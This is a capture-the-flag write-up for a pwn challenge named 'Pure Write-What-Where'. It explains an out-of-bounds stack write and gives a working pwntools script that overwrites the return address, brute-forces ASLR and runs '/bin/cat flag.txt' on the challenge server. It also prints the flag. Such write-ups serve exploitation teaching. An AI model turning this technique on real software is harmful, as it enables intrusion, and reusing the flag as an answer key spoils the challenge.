https://ctftime.org/event/2512

# Pure Write-What-Where (pwn)

Straight to the point.

-ProfNinja

nc 0.cloud.chals.io 16612

## Analysis

`vuln` @ `0x124b`
- Reads in a 4 byte offset `scanf("%d, &local_7c)`
- Reads in a 2 byte value `scanf("%hd, local_7e)`
- Writes the 2 byte value at the 4 byte offset to a location on the stack `auStack_78[local_7c] = local_7e`
    - The location on the stack to write is computed as follows `word ptr [RBP + RAX*0x2 + -0x70],DX` @ `0x12c1`
        - e.g `RBP + (60 * 2) - 0x70 => RBP + 8`

## Solution

1) Specify `60` such that we write to the return address on the stack
    - i.e `RBP + (60 * 2) - 0x70 => RBP + 8`
2) Attempt to modify the last two bytes of the return address such that it points to `win`
    - Due to ASLR we only have a 1 in 16 chance of guessing the most significant nibble of the 2nd byte correctly
        - Therefore we must try a few times until our write happens to have the same value and effectively leaves this nibble unchanged

```python
#!/usr/bin/env python3

from pwn import *

context.log_level = "critical"
elf = ELF("./pwnme", checksec=True)
context.binary = elf

while True:
    try:
        with remote("0.cloud.chals.io", 16612) as p:
            p.sendline(str(60).encode())
            p.sendline(str((elf.sym["win"] + 8) & 0xffff).encode())
            p.sendline(b"/bin/cat flag.txt")
            p.readline()
            p.readline()
            flag = p.readline()
            if b"udctf{" in flag:
                print(flag.decode()) # udctf{th3_0n3_1n_s1xt33n_pwn_str4t_FTW}
                break
    except:
        continue
```

## Flag
`udctf{th3_0n3_1n_s1xt33n_pwn_str4t_FTW}`

smiley 2024/11/10
